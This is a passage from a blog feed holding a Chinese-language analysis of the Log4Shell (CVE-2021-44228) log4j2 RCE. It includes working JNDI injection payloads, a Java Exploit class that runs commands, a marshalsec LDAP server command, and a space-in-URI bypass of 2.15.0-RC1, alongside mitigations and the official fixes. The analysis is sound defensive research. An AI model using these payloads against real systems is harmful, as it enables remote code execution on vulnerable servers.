    <category term="Java Agent" scheme="https://cn.4xpl0r3r.com/tags/Java-Agent/"/>
    
    <category term="恶意代码检测与隐藏" scheme="https://cn.4xpl0r3r.com/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8F/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-44228 log4j2 RCE 分析</title>
    <link href="https://cn.4xpl0r3r.com/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-44228-log4j2-RCE-%E5%88%86%E6%9E%90/"/>
    <id>https://cn.4xpl0r3r.com/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-44228-log4j2-RCE-%E5%88%86%E6%9E%90/</id>
    <published>2022-01-19T13:06:00.000Z</published>
    <updated>2022-02-13T11:45:09.574Z</updated>
    
    <content type="html"><![CDATA[<p>使用Java 8u181</p><span id="more"></span><article class="message message-immersive is-primary"><div class="message-body"><i class="fas fa-globe-americas mr-2"></i>本文同时提供以下语言的翻译：<a href="https://4xpl0r3r.com/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-44228-Log4Shell/">English</a>.</div></article><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Apache Log4j2是一个基于Java的日志记录工具。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p><p>漏洞适用版本为2.0 &lt;= Apache log4j2 &lt;= 2.14.1，只需检测Java应用是否引入log4j-core这个jar。若存在应用使用，极大可能会受到影响。</p><h2 id="Exploit-复现"><a href="#Exploit-复现" class="headerlink" title="Exploit 复现"></a>Exploit 复现</h2><h3 id="漏洞复现代码"><a href="#漏洞复现代码" class="headerlink" title="漏洞复现代码"></a>漏洞复现代码</h3><p>采用Maven构建Trigger项目</p><p>引入<code>org.apache.logging.log4j</code>  版本<code>2.14.1</code>包</p><p>触发代码，只要logger使用了可记录等级进行记录，就会触发漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://ip:1389/#Exploit&#125;123&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JNDI-Payload-代码"><a href="#JNDI-Payload-代码" class="headerlink" title="JNDI Payload 代码"></a>JNDI Payload 代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> IOException,InterruptedException</span>&#123;</span><br><span class="line">        String cmd=<span class="string">&quot;curl 127.0.0.1:5555&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        printMessage(process.getInputStream());;</span><br><span class="line">        printMessage(process.getErrorStream());</span><br><span class="line">        <span class="keyword">int</span> value=process.waitFor();</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printMessage</span><span class="params">(<span class="keyword">final</span> InputStream input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread (<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                Reader reader =<span class="keyword">new</span> InputStreamReader(input);</span><br><span class="line">                BufferedReader bf = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                String line = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> ((line=bf.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException  e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译这段代码以便后续的JNDI调用使用，触发构造方法执行命令</p><h3 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h3><p>典型的使用JNDI进行触发</p><p>首先在class文件处开启HTTP服务</p><p>然后利用marshalsec开启LDAP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080/<span class="comment">#Exploit</span></span><br></pre></td></tr></table></figure><p>运行main函数，成功触发</p><h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><h3 id="代码利用链分析"><a href="#代码利用链分析" class="headerlink" title="代码利用链分析"></a>代码利用链分析</h3><p>由于我们知道是JNDI注入，因此在<code>javax.naming.InitialContext</code>的构造方法处下断点</p><p>文件位于<code>rt.jar/javax/naming/InitialContext.java</code></p><p>成功抓到断点</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116165713751.png" alt="image-20220116165713751"></p><p>调用栈信息如下</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116165748332.png" alt="image-20220116165748332"></p><p>我们知道要触发JNDI漏洞必须要通过lookup函数，从<code>JndiLookup.lookup</code>函数向上回溯</p><p>我们往Payload加入一些杂物，看看什么时候聚焦到payload <code>$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;</code></p><p>可以发现<code>substitute</code>会将payload <code>AAAAA$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;BBBBB</code>解引用变成JNDI URI<code>ldap://127.0.0.1:1389/#Exploit</code></p><p>除此之外，我们可以发现<code>resolveVariable</code>用于处理使用<code>$&#123;&#125;</code>包裹的变量</p><p>再继续往上回溯，可以发现如下一段代码</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116170645443.png" alt="image-20220116170645443"></p><p>可以发现只要遇到<code>$&#123;</code>则开始调用StrSubstuitutor的replace方法进行解析</p><h3 id="漏洞深入分析"><a href="#漏洞深入分析" class="headerlink" title="漏洞深入分析"></a>漏洞深入分析</h3><p>log4j2的三大组件</p><ul><li>Logger 日志记录器</li><li>Appender 日志输出</li><li>Layout 日志格式化</li></ul><p>继续分析前面得到的调用栈，可以发现</p><p>在log4j2中通过<code>LoggerConfig.processLogEvent()</code>处理日志事件，主要部分在调用<code>callAppenders()</code>即调用Appender</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116172122778.png" alt="image-20220116172122778"></p><p>Appender功能主要是负责将日志事件传递到其目标，常用的Appender有ConsoleAppender（输出到控制台）、FileAppender（输出到本地文件）等，通过AppenderControl获取具体的Appender，本次调试的是ConsoleAppender。</p><p>Appender调用Layout获取日志格式，通过<code>Layout.encode()</code>进行日志的格式化</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116172221859.png" alt="image-20220116172221859"></p><p> Layout会获取formatters来完成具体的格式化</p><p>处理传入的message通过<code>MessagePatternConverter.format()</code>，也是本次漏洞的关键之处。当config存在并且noLookups为false，匹配到<code>$&#123;&#39;</code>则调用<code>workingBuilder.append()</code>获取StrSubstitutor内容来替换原来的信息。</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116170645443.png" alt="image-20220116170645443"></p><p>可以发现此处有个noLookups，是一个配置值，默认为false，之后我们研究下如何利用它进行防御</p><p>再往前看，然后是<code>StrSubstitutor.resolveVariable()</code>进行解析，可以发现支持这些协议</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116173400517.png" alt="image-20220116173400517"></p><p>其中就包含了JNDI</p><h3 id="安全缓解措施-利用系统配置禁止LookUp"><a href="#安全缓解措施-利用系统配置禁止LookUp" class="headerlink" title="安全缓解措施 - 利用系统配置禁止LookUp"></a>安全缓解措施 - 利用系统配置禁止LookUp</h3><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116170645443.png" alt="image-20220116170645443"></p><p>noLookups通过交叉引用可以找到</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116172659445.png" alt="image-20220116172659445"></p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116172735690.png" alt="image-20220116172735690"></p><p>这里先一种最简单的——直接代码增加配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;log4j2.formatMsgNoLookups&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> Logger logger = LogManager.getLogger();</span><br><span class="line">        logger.error(<span class="string">&quot;AAAAA$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;BBBBBB&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次运行，可以发现不会对<code>$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;</code>进行解析</p><p>除此之外，也可以通过properties文件或命令行进行配置</p><h3 id="安全缓解措施-通过log4j2的配置文件禁止LookUp"><a href="#安全缓解措施-通过log4j2的配置文件禁止LookUp" class="headerlink" title="安全缓解措施 - 通过log4j2的配置文件禁止LookUp"></a>安全缓解措施 - 通过log4j2的配置文件禁止LookUp</h3><blockquote><p>我认为这是除了升级外最好的方法</p><p>参考官方文档：<a href="https://logging.apache.org/log4j/2.x/manual/configuration.html">Log4j – Configuring Log4j 2 (apache.org)</a></p></blockquote><p>除了XML还支持其它格式，以XML为例，在resource中创建<code>log4j2.xml</code>，一个能禁止LookUp的最小可用配置如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;[%t] %-5level %m&#123;nolookups&#125; %n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="拓展思考-log4j2为什么需要JNDI功能"><a href="#拓展思考-log4j2为什么需要JNDI功能" class="headerlink" title="拓展思考 - log4j2为什么需要JNDI功能"></a>拓展思考 - log4j2为什么需要JNDI功能</h3><p>在<a href="https://logging.apache.org/log4j/log4j-2.3/manual/configuration.html#PropertySubstitution">Log4j – Configuring Log4j 2 - Apache Log4j 2</a>找到Property Substitution（属性替换）功能，以通过本地之外的来源获取属性，使日志信息更加丰富</p><p>由于开发者没有考虑到JNDI的潜在危害，因此没有将其默认配置值设置为不加载也没有对JNDI来源地址进行限制</p><h2 id="其它拓展"><a href="#其它拓展" class="headerlink" title="其它拓展"></a>其它拓展</h2><h3 id="常见的假阳性结果"><a href="#常见的假阳性结果" class="headerlink" title="常见的假阳性结果"></a>常见的假阳性结果</h3><p>许多测试者通过DNS信息来判断是否发生了解析，以此来确定漏洞是否触发，这是不严谨的，许多公共服务都可能对这个地址进行DNS查询，用于垃圾拦截等功能，这不能代表其成功触发了漏洞</p><p>比较好的方式是在子域名中添加一个内嵌查询，如<code>$&#123;sys:java.version&#125;</code></p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol><li>升级log4j core的最新版本</li><li>在配置文件中的Layout设置禁止LookUp</li><li>在系统配置中将设置<code>formatMsgNoLookups</code>为true，禁止LookUp</li></ol><h3 id="官方的修复方法"><a href="#官方的修复方法" class="headerlink" title="官方的修复方法"></a>官方的修复方法</h3><blockquote><p>参考：<a href="https://logging.apache.org/log4j/2.x/changes-report.html">https://logging.apache.org/log4j/2.x/changes-report.html</a></p></blockquote><p>在2.15.0已默认禁用Message里的Lookups，并且默认限制了JNDI以及LDAP可以获取的类</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117152244412.png" alt="image-20220117152244412"></p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117152320407.png" alt="image-20220117152320407"></p><p>除此之外，在2.16.0，默认禁用JNDI，需要使用<code>log4j.enableJndi</code>来启用</p><p>彻底移除在Message中的LookUps支持</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116194734802.png" alt="image-20220116194734802"></p><h2 id="log4j-2-15-0-RC1绕过"><a href="#log4j-2-15-0-RC1绕过" class="headerlink" title="log4j 2.15.0-RC1绕过"></a>log4j 2.15.0-RC1绕过</h2><p>Google了解到2.15.0-RC1这个候选发行版仍然存在可以被Bypass的可能性</p><h3 id="编译log4j-2-15-0-RC1"><a href="#编译log4j-2-15-0-RC1" class="headerlink" title="编译log4j 2.15.0-RC1"></a>编译log4j 2.15.0-RC1</h3><blockquote><p>由于RC版本现在在Maven仓库已经没有了，所有只能去GitHub手动获取源代码进行编译</p><p><a href="https://github.com/apache/logging-log4j2/tags">Tags · apache/logging-log4j2 (github.com)</a></p></blockquote><p>下载源代码后，根据README，先配置toolschains，调整jdk位置，由于只需要jdk1.8的包，只使用1.8的toolchain，其它注释掉</p><p>由于不需要编译所有包，在<code>pom.xml</code>中找到<code>modules</code></p><p>将不需要的包注释，仅保留<code>log4j-core</code>和<code>log4j-api</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;module&gt;log4j-api-java9&lt;/module&gt; --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">module</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;module&gt;log4j-core-java9&lt;/module&gt; --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">module</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;module&gt;log4j-layout-template-json&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-core-its&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-1.2-api&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-slf4j-impl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-slf4j18-impl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-to-slf4j&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jcl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-flume-ng&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-taglib&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jmx-gui&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-samples&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-bom&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jdbc-dbcp2&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jpa&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-couchdb&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-mongodb3&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-mongodb4&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-cassandra&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-web&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jakarta-web&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-perf&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-iostreams&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jul&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jpl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-liquibase&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-appserver&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-osgi&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-docker&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-kubernetes&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-spring-boot&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-spring-cloud-config&lt;/module&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用如下mvn指令编译</p><ul><li><p><code>-t toolchains-sample-mac.xml</code> 指定toolchains文件</p></li><li><p><code>-Dmaven.test.skip=true</code> 跳过测试</p></li><li><p><code>-Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=1099</code> 使用代理加速</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># JAVA_HOME设置为jdk1.8</span></span><br><span class="line">./mvnw clean install -t toolchains-sample-mac.xml -Dmaven.test.skip=<span class="literal">true</span> -Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=1099</span><br></pre></td></tr></table></figure><p>编译完成后生成的artifact(jar包)在各个module的target文件夹中</p><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>在pom.xml修改log4j-core版本为2.15.0，然后将编译出来的jar包全部替换进去</p><p>由于2.15.0版本中默认禁用了LookUp，我们首先需要通过配置将其打开</p><p>修改<code>log4j2.xml</code>配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;[%t] %-5level %m&#123;lookups&#125; %n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时，Payload如下可以被解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;sys:java.version&#125;</span><br></pre></td></tr></table></figure><p>但是JNDI Payload不会被解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://ip:1389/#Exploit&#125;</span><br></pre></td></tr></table></figure><p>由于我们知道现在<code>$&#123;&#125;</code>还是会解析，但是jndi受限制，所以根据之前的分析，我们前往<code>StrSubstitutor.resolveVariable()</code>看看变量解析的工作流程</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117231047455.png" alt="image-20220117231047455"></p><p>进入<code>lookup()</code></p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117231511877.png" alt="image-20220117231511877"></p><p>我们可以发现JNDI其实还是可以解析的，再进入一层<code>lookup</code>，观察JNDI内部受到了什么限制</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117231809554.png" alt="image-20220117231809554"></p><p>继续进入jndiManager的lookup</p><p>可以发现，首先使用了一些协议和来源地址的限制</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117232148838.png" alt="image-20220117232148838"></p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117232027812.png" alt="image-20220117232027812"></p><p>来源地址可以发现是本机的一些IP，此时假设来源地址的限制也不影响我们，我们也是在本地做测试，并且ldap也在允许的协议中</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117232751415.png" alt="image-20220117232751415"></p><p>可以发现此处禁止了引用对象的使用，检查方法是<code>attributeMap.get(OBJECT_FACTORY)!=null</code></p><p>除此之外，还限制了JNDI的另一种利用方式——反序列化，其通过<code>allowedClasses</code>将可以反序列化的类型限制在了Java的几个基本类型</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117234337261.png" alt="image-20220117234337261"></p><p>虽然局部看起来很完美，但是代码的异常捕捉逻辑有问题，可以看到如下</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117232926045.png" alt="image-20220117232926045"></p><p>如果出现URI语法错误，就可以直接触发异常处理并进入lookup，那要如何让URI出错又能正常lookup呢？</p><p>只需往URI中加一个无URL编码的空格即可，lookup的时候会忽略这个空格，我们把payload改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1:1389/# Exploit&#125;</span><br></pre></td></tr></table></figure><p>可以发现成功触发命令执行</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220117233150910.png" alt="image-20220117233150910"></p><h3 id="绕过总结"><a href="#绕过总结" class="headerlink" title="绕过总结"></a>绕过总结</h3><p>此处绕过的条件较为苛刻，必须满足如下两个条件</p><ul><li>开发者主动开启lookups功能</li><li>LDAP来源地址必须在白名单中，而默认白名单为本机地址</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.youtube.com/watch?v=w2F67LbEtnk&feature=youtu.be">Log4j Vulnerability (Log4Shell) Explained // CVE-2021-44228 - YouTube</a></li><li><a href="https://logging.apache.org/log4j/2.x/changes-report.html">https://logging.apache.org/log4j/2.x/changes-report.html</a></li><li><a href="https://paper.seebug.org/1786/">log4j2 漏洞分析与思考 (seebug.org)</a></li><li><a href="https://www.anquanke.com/post/id/262668">Apache Log4j2 远程代码执行漏洞分析 - 